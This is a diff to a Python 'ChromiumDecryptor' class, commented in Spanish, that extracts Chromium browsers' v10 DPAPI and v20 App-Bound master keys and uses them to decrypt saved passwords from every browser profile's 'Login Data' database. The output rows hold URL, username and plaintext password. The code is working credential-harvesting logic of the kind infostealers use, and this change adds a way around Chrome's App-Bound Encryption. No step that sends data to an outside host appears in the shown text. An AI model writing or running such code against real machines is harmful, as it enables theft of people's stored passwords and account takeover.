@@ -296,32 +296,29 @@ class ChromiumDecryptor:
 
     # ── Obtención de Llave AES ─────────────────────────────────────────────────
 
-    def get_key(self, user_data_path: Path):
+    def get_keys(self, user_data_path: Path):
         """
-        Extrae y descifra la master key AES del Local State.
-        Retorna (aes_key: bytes | None, dpapi_available: bool).
-        
-        - aes_key=None + dpapi_available=True  → perfil legacy, solo DPAPI
-        - aes_key=bytes + dpapi_available=True  → perfil moderno, ambos modos posibles
-        - aes_key=None + dpapi_available=False  → entorno sin soporte (sin win32crypt)
+        Extrae y descifra las master keys (v10 y v20) del Local State.
+        Retorna (keys: dict, dpapi_available: bool).
         """
         dpapi_available = bool(win32crypt)
+        keys = {}
         ls = user_data_path / "Local State"
 
         if not ls.exists():
             logger.debug(f"Local State no encontrado en: {user_data_path}")
-            return None, dpapi_available
+            return keys, dpapi_available
 
         try:
             with open(ls, "r", encoding="utf-8") as f:
                 config = json.load(f)
         except Exception as e:
             logger.warning(f"Error leyendo Local State ({user_data_path}): {e}")
-            return None, dpapi_available
+            return keys, dpapi_available
 
+        # 1. Intentar obtener llave v20 (App-Bound)
         app_bound_b64 = config.get("os_crypt", {}).get("app_bound_encrypted_key")
         if app_bound_b64 and win32crypt:
-            # Verificar privilegios de administrador para V20
             is_admin = False
             try: is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             except: pass
@@ -332,43 +329,35 @@ class ChromiumDecryptor:
             try:
                 import importlib
                 v20_module = importlib.import_module('modules.chrome_v20_decryption.v20_decryptor')
-                aes_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
-                if aes_key:
-                    logger.debug(f"Master key AES (v20) obtenida ({len(aes_key)} bytes) para: {user_data_path}")
-                    return aes_key, True
+                v20_key = v20_module.get_v20_key(app_bound_b64, win32crypt)
+                if v20_key:
+                    logger.debug(f"Master key AES (v20) obtenida ({len(v20_key)} bytes) para: {user_data_path}")
+                    keys['v20'] = v20_key
             except Exception as e:
                 logger.debug(f"Fallback desde v20. Error: {e}")
 
+        # 2. Intentar obtener llave v10 (DPAPI normal)
         encrypted_key_b64 = config.get("os_crypt", {}).get("encrypted_key")
-        if not encrypted_key_b64 and not app_bound_b64:
+        if encrypted_key_b64:
+            try:
+                raw = base64.b64decode(encrypted_key_b64)
+                if raw.startswith(b"DPAPI"):
+                    encrypted = raw[5:]
+                    if win32crypt:
+                        v10_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
+                        logger.debug(f"Master key AES (v10) obtenida ({len(v10_key)} bytes) para: {user_data_path}")
+                        keys['v10'] = v10_key
+            except Exception as e:
+                logger.warning(f"Error descifrando master key v10 en {user_data_path}: {e}")
+
+        if not keys:
             logger.debug(f"No hay llaves validas en os_crypt para: {user_data_path}")
-            return None, dpapi_available
-        elif not encrypted_key_b64:
-            return None, dpapi_available
 
-        try:
-            raw = base64.b64decode(encrypted_key_b64)
-            # Los primeros 5 bytes son el literal ASCII "DPAPI"
-            if not raw.startswith(b"DPAPI"):
-                logger.warning(f"Prefijo DPAPI inesperado en Local State: {user_data_path}")
-                return None, dpapi_available
-
-            encrypted = raw[5:]
-            if not win32crypt:
-                logger.debug("win32crypt no disponible, no se puede descifrar master key")
-                return None, False
-
-            aes_key = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
-            logger.debug(f"Master key AES obtenida ({len(aes_key)} bytes) para: {user_data_path}")
-            return aes_key, True
-
-        except Exception as e:
-            logger.warning(f"Error descifrando master key en {user_data_path}: {e}")
-            return None, dpapi_available
+        return keys, dpapi_available
 
     # ── Descifrado por Blob ────────────────────────────────────────────────────
 
-    def decrypt(self, blob: bytes, aes_key: bytes | None) -> str:
+    def decrypt(self, blob: bytes, keys: dict) -> str:
         """
         Descifra un blob individual de password_value de Chromium.
 
@@ -384,9 +373,16 @@ class ChromiumDecryptor:
 
         # ── AES-GCM (Chromium v80+, prefijo v10, v11, o v20) ───────────────────
         if blob[:3] in (b"v10", b"v11", b"v20"):
+            prefix = blob[:3].decode('ascii', errors='ignore')
+            aes_key = keys.get(prefix)
+            
+            # v11 usa la misma llave que v10
+            if prefix == "v11":
+                aes_key = keys.get("v10")
+
             if not aes_key:
-                logger.debug("Blob AES-GCM sin llave disponible")
-                if blob.startswith(b"v20"):
+                logger.debug(f"Blob AES-GCM sin llave disponible para prefijo {prefix}")
+                if prefix == "v20":
                     return "[Admin Required for v20]"
                 return "[Sin Llave AES]"
 
@@ -398,13 +394,16 @@ class ChromiumDecryptor:
             ciphertext = blob[15:-16]
             tag        = blob[-16:]
 
+            if AES is None:
+                logger.debug("Cryptodome no está instalado. No se puede instanciar AES.")
+                return "[Error AES-GCM: Cryptodome missing]"
+
             try:
                 cipher = AES.new(aes_key, AES.MODE_GCM, nonce)
                 plain  = cipher.decrypt_and_verify(ciphertext, tag)
                 return plain.decode("utf-8", errors="replace").strip()
             except Exception as e:
-                logger.debug(f"AES-GCM falló (llave incorrecta o blob corrupto): {e}")
-                # El blob tiene prefijo v10 pero la llave no lo descifra.
+                logger.debug(f"AES-GCM falló para {prefix} (llave incorrecta o blob corrupto): {e}")
                 # Intentamos DPAPI por si es un blob migrado a medias.
                 if win32crypt:
                     try:
@@ -468,15 +467,15 @@ class ChromiumDecryptor:
             if not base_path.exists():
                 continue
 
-            # La llave AES se obtiene una vez por navegador (del Local State raíz)
-            aes_key, dpapi_ok = self.get_key(base_path)
+            # Las llaves AES se obtienen una vez por navegador (del Local State raíz)
+            keys, dpapi_ok = self.get_keys(base_path)
 
-            if not aes_key and not dpapi_ok:
+            if not keys and not dpapi_ok:
                 logger.info(f"[{browser_name}] Sin capacidad de descifrado, omitiendo.")
                 continue
 
-            if not aes_key:
-                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master key AES).")
+            if not keys:
+                logger.debug(f"[{browser_name}] Solo modo DPAPI (sin master keys AES).")
 
             profiles = self._scan_profiles(base_path, multi_profile)
 
@@ -489,7 +488,7 @@ class ChromiumDecryptor:
                     "name":        browser_name,
                     "profile":     profile_path.name,
                     "db_path":     profile_path / "Login Data",
-                    "key":         aes_key,
+                    "keys":        keys,
                     "dpapi_ok":    dpapi_ok,
                 })
 
@@ -532,7 +531,7 @@ class ChromiumDecryptor:
                     if not blob:
                         continue
 
-                    pwd = self.decrypt(blob, t['key'])
+                    pwd = self.decrypt(blob, t['keys'])
                     entry = [t['name'], t['profile'], url, user, pwd]
 
                     if url.startswith(VALID_URL_PREFIXES):
